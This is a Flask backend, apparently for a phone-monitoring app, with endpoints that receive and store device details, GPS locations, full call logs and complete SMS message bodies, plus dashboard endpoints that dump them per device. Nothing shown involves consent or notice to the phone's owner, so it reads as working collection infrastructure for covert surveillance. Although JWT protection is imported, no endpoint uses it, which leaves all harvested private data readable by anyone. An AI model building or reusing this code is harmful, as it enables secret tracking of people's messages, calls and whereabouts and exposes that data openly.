from flask import Blueprint , request , jsonify
from flask_jwt_extended import jwt_required
from datetime import datetime
from models import db, DeviceInfo, CallLog, DeviceLocation, DeviceStatus, DeviceStatusEnum , SMSLog , SMSTypeEnum
device_routes=Blueprint('device_routes', __name__)
from datetime import datetime, timedelta , timezone
import pytz

def to_ist(dt):
    ist = pytz.timezone("Asia/Kolkata")
    if dt.tzinfo is None:
        dt = pytz.utc.localize(dt)
    return dt.astimezone(ist)

class DeviceAPI:
    @staticmethod
    @device_routes.route('/device-details',methods=['POST'])
    def save_device_details():
        payload=request.get_json()
        print("/POST/device-details:",payload)
        info=payload.get("device_info",{})
        loc_data=payload.get("location",{})
        device_id=info.get("device_id")

        if not device_id:
            return jsonify({"success":False,"message":"Device ID is required"}),400
        device=DeviceInfo.query.filter(DeviceInfo.device_id==device_id).first()
        if not device:
            device=DeviceInfo(
                device_id=device_id,
                os_version=info.get("os_version", ""),
                phone_name=info.get("phone_name", ""),
                brand=info.get("brand", ""),
                manufacturer=info.get("manufacturer", ""),
                host=info.get("host", ""),
            )
            db.session.add(device)
            if loc_data:
                try:
                    new_loc=DeviceLocation(
                        device_id=device_id,
                        latitude=loc_data.get("latitude", 0.0),
                        longitude=loc_data.get("longitude", 0.0),
                        accuracy=loc_data.get("accuracy", 0.0),
                    )
                    db.session.add(new_loc)
                except Exception as e:
                    db.session.rollback()
                    return jsonify({"success": False, "message": str(e)}), 500
            db.session.commit()
            return jsonify({"success": True, "message": "Device details saved successfully"}), 201
        else:
            device.os_version=info.get("os_version", device.os_version)
            device.phone_name=info.get("phone_name", device.phone_name)
            device.brand=info.get("brand", device.brand)
            device.manufacturer=info.get("manufacturer", device.manufacturer)
            device.host=info.get("host", device.host)
            if loc_data:
                try:
                    new_loc = DeviceLocation(
                    device_id=device_id,
                    latitude=loc_data.get("latitude", 0.0),
                    longitude=loc_data.get("longitude", 0.0),
                    accuracy=loc_data.get("accuracy", 0.0),
                    )
                    db.session.add(new_loc)
                except Exception as e:
                    db.session.rollback()
                    return jsonify({"success": False, "message": str(e)}), 500

            db.session.commit()
            return jsonify({"success": True, "message": "Device details updated successfully"}), 200
  
    @staticmethod
    @device_routes.route('/device-details',methods=['PUT'])
    def update_device_details():
        payload=request.get_json()
        info=payload.get("device_info",{})
        loc_data=payload.get("location",{})
        device_id=info.get("device_id")
        if not device_id:
            return jsonify({"success":False,"message":"Device ID is required"}),400
        device=DeviceInfo.query.filter(DeviceInfo.device_id==device_id).first()
        if not device:
            return jsonify({"success": False, "message": "Device not found"}), 404
        try:
            device.os_version=info.get("os_version", device.os_version)
            device.phone_name=info.get("phone_name", device.phone_name)
            device.brand=info.get("brand", device.brand)
            device.manufacturer=info.get("manufacturer", device.manufacturer)
            device.host=info.get("host", device.host)
            if loc_data:
                try:
                    new_loc = DeviceLocation(
                    device_id=device_id,
                    latitude=loc_data.get("latitude", 0.0),
                    longitude=loc_data.get("longitude", 0.0),
                    accuracy=loc_data.get("accuracy", 0.0),
                    )
                    db.session.add(new_loc)
                except Exception as e:
                    db.session.rollback()
                    return jsonify({"success": False, "message": str(e)}), 500

            db.session.commit()
            return jsonify({"success": True, "message": "Device details updated successfully"}), 200
        except Exception as e:
            db.session.rollback()
            return jsonify({"success": False, "message": str(e)}), 500
        
    @staticmethod
    @device_routes.route('/update-call-logs',methods=['POST'])
    def save_call_log():
        data=request.get_json()
        print("/POST/update-call-logs:",data)
        device_id=data.get("device_id")
        call_logs=data.get("call_logs",[])
        if not device_id:
            return jsonify({"success": False, "message": "Device ID required"}), 400
        try:
            for call in call_logs:
                log=CallLog(
                call_id=call.get("call_id"),
                device_id=device_id,
                user_id=call.get("user_id", ""),
                version=call.get("version", ""),
                phone_number=call.get("phone_number", ""),
                call_duration=call.get("call_duration", "00:00:00"),
                number_type=call.get("number_type", ""),
                number_label=call.get("number_label", ""),
                name=call.get("name", ""),
                type=call.get("type", ""),
                cached_number_type=call.get("cached_number_type", ""),
                cached_number_label=call.get("cached_number_label", ""),
                cached_matched_number=call.get("cached_matched_number", ""),
                sim_display_name=call.get("sim_display_name", ""),
                phone_account_id=call.get("phone_account_id", ""),
                )
                db.session.add(log)
            db.session.commit()
            return jsonify({"success": True, "message": "Call logs saved successfully"}), 201
        except Exception as e:
            db.session.rollback()
            return jsonify({"success": False, "message": str(e)}), 500
        
    @staticmethod
    @device_routes.route('/location-save',methods=['POST'])
    def save_location():
        data=request.get_json()
        print("/POST/location-save:",data)
        device_id=data.get("device_id")
        if not device_id:
            return jsonify({"success": False, "message": "Device ID is required"}), 400
        
        loc=DeviceLocation(
            device_id=device_id,
            latitude=data.get("latitude", 0.0),
            longitude=data.get("longitude", 0.0),
            accuracy=data.get("accuracy", 0.0),
        )
        try:
            db.session.add(loc)
            db.session.commit()
            return jsonify({"success": True, "message": "Location saved successfully"}), 201
        except Exception as e:
            db.session.rollback()
            return jsonify({"success": False, "message": str(e)}), 500
        
    @staticmethod
    @device_routes.route('/heartbeat', methods=['POST'])
    def save_status():
        data = request.get_json()
        print("/POST/heartbeat:",data)
        device_id = data.get("device_id")
        if not device_id:
            return jsonify({"success": False, "message": "Device ID is required"}), 400
        status=DeviceStatusEnum(data.get("status", DeviceStatusEnum.ACTIVE.value))
        status = DeviceStatus(
            device_id=device_id,
            status=status,
        )
        try:
            db.session.add(status)
            db.session.commit()
            return jsonify({"success": True, "message": "Device status saved successfully"}), 201
        except Exception as e:
            db.session.rollback()
            return jsonify({"success": False, "message": str(e)}), 500
    
    @staticmethod
    @device_routes.route('/save-sms-logs',methods=['POST'])
    def save_sms_log():
        data = request.get_json()
        print("/POST/save-sms-logs:",data)
        device_id = data.get("device_id")
        sms_list=data.get("sms",[])
        if not device_id:
            return jsonify({"success": False, "message": "Device ID is required"}), 400
        try:
            for sms in sms_list:
                sms_log = SMSLog(
                device_id=device_id,
                address=sms.get("address", ""),
                body=sms.get("body", ""),
                type=SMSTypeEnum(sms.get("type", SMSTypeEnum.OUTBOX.value)),
                )
                db.session.add(sms_log)
            db.session.commit()
            return jsonify({"success": True, "message": "SMS logs saved successfully"}), 201
        except Exception as e:
            db.session.rollback()
            return jsonify({"success": False, "message": str(e)}), 500
        
   

    @staticmethod
    @device_routes.route('/get-all-devices', methods=['GET'])
    def get_all_devices():
        try:
            devices = DeviceInfo.query.all()
            device_list = []

            for device in devices:
                # Get the latest status for this device
                latest_status = DeviceStatus.query \
                    .filter_by(device_id=device.device_id) \
                    .order_by(DeviceStatus.timestamp.desc()) \
                    .first()

                # Default values
                status = "inactive"
                last_seen = "Never"

                if latest_status:
                    now_ist = to_ist(datetime.utcnow())

                    status_time = latest_status.timestamp
                    if status_time.tzinfo is None:
                        status_time = pytz.utc.localize(status_time)
                    status_time_ist = to_ist(status_time)
                    
                    time_diff = now_ist - status_time_ist
                    if time_diff <= timedelta(minutes=1):
                        status = "active"
                    else:
                        status = "inactive"

                    last_seen = latest_status.timestamp.strftime("%Y-%m-%d %H:%M:%S")

                device_list.append({
                    "device_id": device.device_id,
                    "os_version": device.os_version,
                    "phone_name": device.phone_name,
                    "brand": device.brand,
                    "manufacturer": device.manufacturer,
                    "host": device.host,
                    "created_at": device.created_at.strftime("%Y-%m-%d %H:%M:%S"),
                    "status": status,
                    "last_seen": last_seen
                })

            return jsonify({"success": True, "devices": device_list}), 200
        except Exception as e:
            import traceback
            traceback.print_exc()
            return jsonify({"success": False, "message": str(e)}), 500

    
    @staticmethod
    @device_routes.route('/get-all-sms-logs',methods=['GET'])
    def get_all_sms_logs():
        try:
            device_id=request.args.get("device_id")
            query=SMSLog.query
            if device_id:
                query=query.filter(SMSLog.device_id==device_id)
            else:
                return jsonify({"success":False , "message":"Device Id required"})
            logs=query.order_by(SMSLog.timestamp.desc()).all()
            sms_list=[{
                "id":log.id,
                "address":log.address,
                "body":log.body,
                "type":log.type.value,
                "timestamp":log.timestamp.strftime("%Y-%m-%d %H:%M:%S")

            } for log in logs]
            return jsonify({"success":True , "sms_logs":sms_list}),200
        except Exception as e:
            return jsonify({"success":False , "message":str(e)}),500
        
    @staticmethod
    @device_routes.route('/get-all-call-logs',methods=['GET'])
    def get_all_call_logs():
        try:
            device_id=request.args.get("device_id")
            query=CallLog.query
            if device_id:
                query=query.filter(CallLog.device_id==device_id)
            logs=query.order_by(CallLog.timestamp.desc()).all()
            call_list=[{
                "call_id": log.call_id,
                "device_id": log.device_id,
                "user_id": log.user_id,
                "version": log.version,
                "phone_number": log.phone_number,
                "call_duration": log.call_duration,
                "number_type": log.number_type,
                "number_label": log.number_label,
                "name": log.name,
                "type": log.type,
                "cached_number_type": log.cached_number_type,
                "cached_number_label": log.cached_number_label,
                "cached_matched_number": log.cached_matched_number,
                "sim_display_name": log.sim_display_name,
                "phone_account_id": log.phone_account_id,
                "timestamp": log.timestamp.strftime("%Y-%m-%d %H:%M:%S")

            } for log in logs]
            return jsonify({"success":True , "call_logs":call_list}),200
        except Exception as e:
            return jsonify({"success":False ,"message":str(e)}),500
    
    @staticmethod
    @device_routes.route('/get-all-location-logs',methods=["GET"])
    def get_all_location_logs():
        try:
            device_id=request.args.get("device_id")
            query=DeviceLocation.query
            if device_id:
                query=query.filter(DeviceLocation.device_id==device_id)
            logs=query.order_by(DeviceLocation.timestamp.desc()).all()
            location_list=[{
                "id":log.id,
                "device_id":log.device_id,
                "latitude":log.latitude,
                "longitude":log.longitude,
                "accuracy":log.accuracy,
                "timestamp":log.timestamp.strftime("%Y-%m-%d %H-%M-%S")
            }for log in logs]
            return jsonify({"success":True , "location_logs":location_list})
        except Exception as e:
            return jsonify({"success":False , "message":str(e)}),500
        
    @staticmethod
    @device_routes.route('/get-device-details',methods=["GET"])
    def get_device_details():
        try:
            device_id=request.args.get("device_id")
            if not device_id:
                return jsonify({"success":False , "message":"DeviceId is required"}),400
            device=DeviceInfo.query.filter_by(device_id=device_id).first()
            if not device:
                return jsonify({"success":False , "message":"Device not found"}),404
            return jsonify({
                "success":True,
                "device":{
                    "device_id":device.device_id,
                    "os_version":device.os_version,
                    "phone_name":device.phone_name,
                    "brand":device.brand,
                    "manufacturer":device.manufacturer,
                    "host":device.host,
                    "created_at":device.created_at.strftime("%Y-%m-%d %H:%M:%S")
                }
            }),200
        except Exception as e:
            return jsonify({"success":False , "message":str(e)}),500

    
        